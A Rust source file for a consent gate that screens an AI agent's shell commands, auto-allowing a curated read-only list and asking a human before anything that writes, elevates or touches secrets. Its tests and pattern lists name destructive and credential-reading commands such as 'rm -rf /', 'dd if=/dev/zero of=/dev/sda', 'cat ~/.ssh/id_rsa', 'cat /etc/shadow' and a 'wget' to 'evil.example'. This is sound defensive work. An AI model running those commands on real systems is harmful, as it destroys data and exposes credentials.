//! Command screening for brokered execs (`[agent_api] confirm_commands`).
//!
//! The gate is deliberately dumb, in the safe direction: a curated set
//! of read-only commands runs without a popup, and everything else —
//! unknown commands, anything that writes or elevates, command
//! substitution, redirections, and any reference to `.env`, dotfiles
//! or key material — asks the human, with the exact command shown.
//! A false "safe" costs data; a false "ask" costs one click.
//!
//! The rules are shell-agnostic on purpose: the same text screens the
//! same way whether the far end runs bash/zsh (Linux, macOS) or
//! PowerShell/cmd (Windows). Quoting is not parsed, so a separator
//! inside quotes screens like a real one — which can only over-ask —
//! and a regex such as `sed 's/./x/'` may too, for the same reason.

/// What one command may do without asking.
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub enum Verdict {
    /// Read-only and on the curated list: run without a popup.
    AutoAllowed,
    /// Everything else: show the human the exact command first.
    NeedsConsent,
}

/// Read-only commands that run without asking, on every shell. The
/// basename of the first word is what matches (after `nice`, `nohup`
/// and `time` wrappers are stripped), so `/bin/ls` is `ls`. The
/// entries with flag guards (`date`, `find`, `git`, `grep`, `rg`,
/// `sed`, `sort`, `systemctl`) sit here too; the guards decide their
/// dangerous spellings.
const SAFE: &[&str] = &[
    // POSIX / Linux / macOS, read-only.
    "awk",
    "basename",
    "cal",
    "cat",
    "cd",
    "cksum",
    "clear",
    "cls",
    "column",
    "cut",
    "date",
    "df",
    "diff",
    "dig",
    "dir",
    "dirname",
    "du",
    "echo",
    "egrep",
    "false",
    "fgrep",
    "file",
    "find",
    "fl",
    "format-list",
    "format-table",
    "free",
    "ft",
    "gc",
    "gci",
    "get-acl",
    "get-childitem",
    "get-command",
    "get-computerinfo",
    "get-content",
    "get-date",
    "get-item",
    "get-member",
    "get-netipconfiguration",
    "get-process",
    "get-service",
    "git",
    "gps",
    "grep",
    "groups",
    "head",
    "host",
    "hostname",
    "id",
    "ipconfig",
    "less",
    "logname",
    "ls",
    "lsof",
    "md5sum",
    "measure-object",
    "more",
    "netstat",
    "nl",
    "nslookup",
    "ping",
    "printf",
    "ps",
    "pwd",
    "readlink",
    "realpath",
    "rev",
    "rg",
    "sed",
    "select-string",
    "sha1sum",
    "sha256sum",
    "sha512sum",
    "sls",
    "sort",
    "sort-object",
    "ss",
    "stat",
    "systemctl",
    "systeminfo",
    "tac",
    "tail",
    "tasklist",
    "test",
    "test-connection",
    "test-path",
    "top",
    "tr",
    "tree",
    "true",
    "type",
    "uname",
    "uniq",
    "uptime",
    "ver",
    "vmstat",
    "w",
    "wc",
    "where-object",
    "whereis",
    "which",
    "who",
    "whoami",
];

/// Harmless wrappers that just run the command after them.
const WRAPPERS: &[&str] = &["nice", "nohup", "time"];

/// `find` spellings that write or run things.
const FIND_DESTRUCTIVE: &[&str] = &[
    "-delete", "-exec", "-execdir", "-ok", "-okdir", "-fls", "-fprintf", "-fprint", "-fprint0",
];

/// `git` subcommands that only read. Everything else asks.
const GIT_READ_ONLY: &[&str] = &[
    "annotate",
    "blame",
    "cat-file",
    "describe",
    "diff",
    "for-each-ref",
    "grep",
    "log",
    "ls-files",
    "ls-remote",
    "merge-base",
    "name-rev",
    "reflog",
    "rev-parse",
    "shortlog",
    "show",
    "status",
];

/// `systemctl` verbs that only read.
const SYSTEMCTL_READ_ONLY: &[&str] = &[
    "cat",
    "help",
    "is-active",
    "is-enabled",
    "is-failed",
    "list-sockets",
    "list-timers",
    "list-unit-files",
    "list-units",
    "show",
    "status",
];

/// The short flags `grep` understands, for spotting recursion inside a
/// combined flag like `-rn`. Characters outside this set (a `-read`,
/// say) mean it is not a grep flag bundle.
const GREP_FLAG_CHARS: &[char] = &[
    'a', 'b', 'c', 'C', 'e', 'E', 'f', 'F', 'h', 'H', 'i', 'I', 'l', 'L', 'n', 'o', 'O', 'p', 'q',
    'r', 'R', 's', 'S', 't', 'T', 'u', 'U', 'v', 'V', 'w', 'W', 'x', 'X', 'y', 'Z', 'z', '0', '1',
    '2', '3', '4', '5', '6', '7', '8', '9',
];

/// Screen one whole command line. A line is safe only when every part
/// of it is: `ls; rm -rf /` asks because its second half does.
pub fn classify(command: &str) -> Verdict {
    // Fd dup redirections (`2>&1`, `1>&2`) change where output goes,
    // never what runs or what gets written to a file; strip them
    // before splitting so `cat f 2>&1 | wc -l` stays safe.
    let flat = command.replace("2>&1", " ").replace("1>&2", " ");
    for segment in flat.split([';', '|', '&', '\n']) {
        if classify_segment(segment.trim()) == Verdict::NeedsConsent {
            return Verdict::NeedsConsent;
        }
    }
    Verdict::AutoAllowed
}

fn classify_segment(seg: &str) -> Verdict {
    if seg.is_empty() {
        return Verdict::AutoAllowed;
    }
    // Command substitution can hide any command; there is no cheap
    // way to screen inside it, so it always asks.
    if seg.contains("$(") || seg.contains('`') {
        return Verdict::NeedsConsent;
    }
    // Redirections write (and overwrite) files.
    if seg.contains('>') {
        return Verdict::NeedsConsent;
    }
    if touches_secret(seg) {
        return Verdict::NeedsConsent;
    }
    let mut words: Vec<&str> = seg.split_whitespace().collect();
    for _ in 0..3 {
        match words.first() {
            Some(w) if WRAPPERS.contains(&first_word(w).as_str()) => {
                words.remove(0);
            }
            _ => break,
        }
    }
    let Some(raw) = words.first().copied() else {
        return Verdict::NeedsConsent;
    };
    let cmd = first_word(raw);
    if !SAFE.contains(&cmd.as_str()) {
        // Default deny: anything the list does not know asks first.
        return Verdict::NeedsConsent;
    }
    flag_guard(&cmd, &words[1..])
}

/// The basename of one word, lowercased: `/bin/rm` reads as `rm`,
/// `Get-Content` reads as `get-content`.
fn first_word(word: &str) -> String {
    word.to_ascii_lowercase()
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or_default()
        .to_owned()
}

/// Extra rules for the safe-listed commands that have dangerous
/// spellings. `args` excludes the command word itself.
fn flag_guard(cmd: &str, args: &[&str]) -> Verdict {
    match cmd {
        "sed" => {
            if args
                .iter()
                .any(|&a| a == "-i" || a.starts_with("-i") || a.starts_with("--in-place"))
            {
                Verdict::NeedsConsent
            } else {
                Verdict::AutoAllowed
            }
        }
        "sort" => {
            if args.iter().any(|&a| a == "-o" || a.starts_with("--output")) {
                Verdict::NeedsConsent
            } else {
                Verdict::AutoAllowed
            }
        }
        // `date -s` sets the clock (root sessions can).
        "date" => {
            if args.iter().any(|&a| a == "-s" || a.starts_with("--set")) {
                Verdict::NeedsConsent
            } else {
                Verdict::AutoAllowed
            }
        }
        "find" => {
            if args
                .iter()
                .any(|a| FIND_DESTRUCTIVE.iter().any(|d| a.starts_with(d)))
            {
                Verdict::NeedsConsent
            } else {
                Verdict::AutoAllowed
            }
        }
        // ripgrep skips dotfiles unless told otherwise.
        "rg" => {
            if args
                .iter()
                .any(|&a| a == "--hidden" || a.starts_with("--hidden="))
            {
                Verdict::NeedsConsent
            } else {
                Verdict::AutoAllowed
            }
        }
        "grep" | "egrep" | "fgrep" => grep_guard(args),
        "systemctl" => {
            if args
                .first()
                .is_some_and(|verb| SYSTEMCTL_READ_ONLY.contains(verb))
            {
                Verdict::AutoAllowed
            } else {
                Verdict::NeedsConsent
            }
        }
        "git" => git_guard(args),
        _ => Verdict::AutoAllowed,
    }
}

/// Recursive grep over a dot-rooted directory reads the contents of
/// dotfiles (`grep -r pattern .`), which is exactly what the human
/// said must always ask.
fn grep_guard(args: &[&str]) -> Verdict {
    let recursive = args.iter().any(|&a| {
        a == "-r"
            || a == "-R"
            || a == "--recursive"
            || a.starts_with("--recursive=")
            || (a.starts_with('-')
                && a.len() > 2
                && a.contains('r')
                && a.chars()
                    .filter(|c| *c != '-')
                    .all(|c| GREP_FLAG_CHARS.contains(&c)))
    });
    if !recursive {
        return Verdict::AutoAllowed;
    }
    let dot_root = args.iter().any(|a| {
        matches!(*a, "." | ".." | "~" | "$HOME" | "./" | "../" | "~/")
            || a.starts_with("~/")
            || a.starts_with("$HOME")
    });
    if dot_root {
        Verdict::NeedsConsent
    } else {
        Verdict::AutoAllowed
    }
}

fn git_guard(args: &[&str]) -> Verdict {
    let Some(&sub) = args.first() else {
        // Bare `git` prints help, but bare-looking is not worth a
        // special case: it is useless to an agent anyway.
        return Verdict::NeedsConsent;
    };
    match sub {
        // `git branch`/`git tag` list when bare or with read flags;
        // `git branch -D x`, `git branch newname` and `git tag v1`
        // change the repository.
        "branch" | "tag" => {
            let rest = &args[1..];
            let creates = rest.first().is_some_and(|a| !a.starts_with('-'))
                || rest
                    .iter()
                    .any(|a| *a == "-d" || *a == "-D" || *a == "--delete");
            if creates {
                Verdict::NeedsConsent
            } else {
                Verdict::AutoAllowed
            }
        }
        // `git remote` lists; `git remote remove` and friends change.
        "remote" => match args.get(1) {
            None | Some(&"-v") | Some(&"--verbose") | Some(&"get-url") | Some(&"show") => {
                Verdict::AutoAllowed
            }
            _ => Verdict::NeedsConsent,
        },
        // `git stash` stashes; only the readers pass.
        "stash" => match args.get(1) {
            Some(&"list") | Some(&"show") => Verdict::AutoAllowed,
            _ => Verdict::NeedsConsent,
        },
        _ if GIT_READ_ONLY.contains(&sub) => Verdict::AutoAllowed,
        _ => Verdict::NeedsConsent,
    }
}

/// Whether a command references anything the human said must always
/// ask: `.env` files, dotfiles, key material, credential stores, and
/// environment-variable dumps.
fn touches_secret(seg: &str) -> bool {
    let lower = seg.to_ascii_lowercase();
    // Any `.env`: `.env`, `.env.local`, `prod.env`, `--env-file=x.env`.
    if lower.contains(".env") {
        return true;
    }
    // PowerShell's environment drive: `Get-ChildItem Env:`, `$env:KEY`.
    // Reading environment variables can leak secrets, so it asks.
    if lower.contains("env:") {
        return true;
    }
    // Secret-named shell variables (`$AWS_SECRET_ACCESS_KEY`,
    // `$GITHUB_TOKEN`) can print a secret just as surely as a file
    // read; ordinary variables (`$PATH`, `$HOME`) stay free.
    if lower.contains('$')
        && ["secret", "token", "password", "credential", "api_key"]
            .iter()
            .any(|m| lower.contains(m))
    {
        return true;
    }
    const MATERIAL: &[&str] = &[
        "id_rsa",
        "id_dsa",
        "id_ecdsa",
        "id_ed25519",
        "authorized_keys",
        "known_hosts",
        ".pem",
        ".ppk",
        "shadow",
        "sudoers",
        "credentials",
    ];
    if MATERIAL.iter().any(|m| lower.contains(m)) {
        return true;
    }
    dotfile_reference(&lower)
}

/// A path that starts at a dot-name: `.bashrc`, `~/.ssh/id_ed25519`,
/// `.git/config`. The path parts `.` and `..` (and `./`, `../`) are
/// not dotfile references; neither is a version like `v1.2`, whose
/// dot does not start a name.
fn dotfile_reference(lower: &str) -> bool {
    let chars: Vec<(usize, char)> = lower.char_indices().collect();
    for (i, &(_, c)) in chars.iter().enumerate() {
        if c != '.' {
            continue;
        }
        let prev_ok = i == 0
            || matches!(
                chars[i - 1].1,
                ' ' | '\t' | '"' | '\'' | '(' | '=' | '/' | '\\'
            );
        let next_ok = chars
            .get(i + 1)
            .is_some_and(|&(_, c)| c.is_ascii_alphanumeric() || c == '_' || c == '@');
        if prev_ok && next_ok {
            return true;
        }
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;
    use Verdict::{AutoAllowed, NeedsConsent};

    fn safe(command: &str) {
        assert_eq!(
            classify(command),
            AutoAllowed,
            "should run silently: {command}"
        );
    }

    fn asks(command: &str) {
        assert_eq!(
            classify(command),
            NeedsConsent,
            "should ask for consent: {command}"
        );
    }

    #[test]
    fn read_only_commands_run_without_asking() {
        safe("ls -la");
        safe("pwd");
        safe("whoami; date");
        safe("uptime && df -h");
        safe("cat /etc/os-release");
        safe("head -20 app.log");
        safe("ps aux | grep -i nginx");
        safe("wc -l < notes.txt");
        safe("/bin/ls"); // the basename is what matches
        safe("nice ls"); // wrappers are stripped
        safe("time grep pattern src/");
        safe("free -m");
        safe("uname -a");
        safe("stat server.py");
        safe("file upload.bin");
        safe("sha256sum image.iso");
        safe("clear");
        safe("which git");
        safe("id && groups");
        safe("echo hello world");
        safe("echo $HOME"); // a variable, not a command substitution
        safe("cat notes.txt 2>&1 | wc -l"); // fd dups are not writes
    }

    #[test]
    fn curated_read_only_tools_with_flags_stay_safe() {
        safe("find /var/log -name '*.log'");
        safe("find . -name '*.rs' -type f"); // lists names, like `ls -la`
        safe("grep -rn TODO src/");
        safe("grep -r token build/");
        safe("sed 's/DEBUG/INFO/' app.log"); // stream filter, no -i
        safe("sort addresses.txt");
        safe("sort -rn scores.txt");
        safe("awk '{print $1}' data.tsv");
        safe("git status");
        safe("git log --oneline -5");
        safe("git diff HEAD~1");
        safe("git show a1b2c3");
        safe("git branch");
        safe("git branch -a");
        safe("git remote -v");
        safe("git rev-parse HEAD");
        safe("systemctl status nginx");
        safe("systemctl list-units --type=service");
        safe("date -u");
        safe("rg 'fn main' src/");
    }

    #[test]
    fn powershell_and_cmd_read_only_commands_run_without_asking() {
        safe("Get-ChildItem");
        safe("gci C:\\logs");
        safe("Get-Content C:\\logs\\app.log");
        safe("Get-Process | Sort-Object cpu");
        safe("Get-Service wuauserv");
        safe("Test-Path C:\\Windows\\win.ini");
        safe("tasklist");
        safe("ipconfig /all");
        safe("systeminfo");
        safe("type install.log");
        safe("dir");
        safe("ping 10.0.0.1");
    }

    #[test]
    fn destructive_commands_ask() {
        asks("rm -rf /");
        asks("rm notes.txt");
        asks("mv a.txt b.txt");
        asks("cp source dest");
        asks("mkdir build");
        asks("touch marker");
        asks("chmod +x deploy.sh");
        asks("chown root:root file");
        asks("truncate -s 0 app.log");
        asks("dd if=/dev/zero of=/dev/sda");
        asks("shutdown -h now");
        asks("reboot");
        asks("kill -9 1234");
        asks("pkill firefox");
        asks("tee config.toml");
        asks("shutdown /s");
    }

    #[test]
    fn writes_and_network_and_elevation_ask() {
        asks("echo hi > /tmp/x");
        asks("cat a >> b");
        asks("ls > /dev/null"); // any redirect asks
        asks("curl http://example.com");
        asks("wget https://evil.example/x");
        asks("ssh admin@remote");
        asks("scp file remote:/tmp");
        asks("sudo ls /root"); // elevation always asks
        asks("sudo cat /etc/hosts");
        asks("docker ps");
        asks("bash -c 'ls'");
        asks("bash deploy.sh");
        asks("make build");
        asks("apt update");
        asks("npm install");
    }

    #[test]
    fn secrets_and_dotfiles_always_ask() {
        asks("cat .env");
        asks("cat prod.env");
        asks("cat .env.local");
        asks("ls .env*");
        asks("cat ~/.ssh/id_rsa"); // dot dir and key material
        asks("ls ~/.aws"); // dot directory
        asks("stat .git/config");
        asks("cat ~/.bashrc");
        asks("head server.pem");
        asks("cat /etc/shadow");
        asks("cat /etc/sudoers");
        asks("cat ~/.aws/credentials");
        asks("env"); // prints the environment, secrets included
        asks("printenv");
        asks("history");
    }

    #[test]
    fn powershell_environment_access_asks() {
        asks("Get-ChildItem Env:");
        asks("ls env:");
        asks("echo $env:AWS_SECRET_ACCESS_KEY");
        asks("Get-Variable PATH");
    }

    #[test]
    fn secret_named_variables_ask() {
        asks("echo $AWS_SECRET_ACCESS_KEY");
        asks("echo $GITHUB_TOKEN");
        asks("echo $PASSWORD");
        asks("print $database_password");
        // Ordinary variables are not secrets.
        safe("echo $PATH");
        safe("echo $HOME");
        safe("cd $PROJECT_ROOT && ls");
        // A file that merely mentions the word is not a secret either.
        safe("cat /etc/passwd");
    }

    #[test]
    fn powershell_and_cmd_destructive_commands_ask() {
        asks("Remove-Item -Recurse -Force stuff");
        asks("del notes.txt");
        asks("rd /s /q build");
        asks("Stop-Process -Name chrome");
        asks("Stop-Computer");
        asks("Restart-Computer");
        asks("Set-Content file.txt 'hi'");
        asks("Out-File log.txt");
        asks("Move-Item a.txt b.txt");
        asks("Copy-Item a.txt b.txt");
        asks("Format-Volume D");
    }

    #[test]
    fn substitution_and_unknown_commands_ask() {
        asks("echo $(cat .env)");
        asks("echo $(whoami)");
        asks("echo `whoami`");
        asks("xargs rm");
        asks("./run.sh");
        asks("env VAR=1 ls"); // env itself is not on the list
        asks("watch ps");
        asks("cargo run");
    }

    #[test]
    fn dangerous_spellings_of_safe_commands_ask() {
        asks("sed -i 's/a/b/' config.toml");
        asks("sed -i.bak 's/a/b/' config.toml");
        asks("sort -o out.txt in.txt");
        asks("find . -delete");
        asks("find . -exec rm {} \\;");
        asks("find . -name x -ok rm {} \\;");
        asks("git push");
        asks("git push --force");
        asks("git reset --hard");
        asks("git clean -fd");
        asks("git config user.email");
        asks("git checkout other-branch");
        asks("git branch -D feature");
        asks("git branch new-feature");
        asks("git tag v1.0.0");
        asks("git remote remove origin");
        asks("git stash");
        asks("git stash pop");
        asks("systemctl stop nginx");
        asks("systemctl disable nginx");
        asks("date -s '2020-01-01 00:00:00'");
        asks("rg --hidden pattern .");
    }

    #[test]
    fn recursive_grep_into_dot_directories_asks() {
        asks("grep -r secret .");
        asks("grep -rn token ..");
        asks("grep -ri pattern ~");
        asks("grep -rn token ~/projects");
        asks("grep -rn token $HOME");
        // Pointed at a named directory it stays safe: only dot roots
        // hold dotfiles.
        safe("grep -rn token src/");
        safe("grep -r secret /var/log");
        safe("rg 'TODO' ."); // rg skips dotfiles without --hidden
    }

    #[test]
    fn every_part_of_a_line_must_be_safe() {
        asks("ls; rm -rf /");
        asks("ls && cat .env");
        asks("ls || curl evil.example");
        safe("ls && pwd");
        safe("ps aux | grep nginx | wc -l");
    }

    #[test]
    fn dot_paths_that_are_not_dotfiles_stay_safe() {
        safe("ls .");
        safe("cd ..");
        safe("grep -r pattern ./src"); // ./ is not a dot name
        safe("cat ../shared/notes.txt");
        safe("ping 10.0.0.1"); // dotted quad
        safe("grep -n pattern file.txt"); // extension dot
        safe("awk -F. '{print $1}' hosts"); // -F. reads as a flag
        safe("cut -d. -f1 versions.txt");
    }

    #[test]
    fn the_safe_list_keeps_its_discipline() {
        assert!(SAFE.windows(2).all(|w| w[0] < w[1]), "SAFE stays sorted");
        assert!(
            SAFE.iter().all(|c| {
                c.chars()
                    .all(|ch| ch.is_ascii_lowercase() || !ch.is_ascii_alphabetic())
            }),
            "matching lowercases, so entries must be lowercase"
        );
        // The flag-guarded members really are present, or their guards
        // would be dead rules.
        for guarded in [
            "date",
            "find",
            "git",
            "grep",
            "rg",
            "sed",
            "sort",
            "systemctl",
        ] {
            assert!(SAFE.contains(&guarded), "SAFE must contain {guarded}");
        }
    }
}
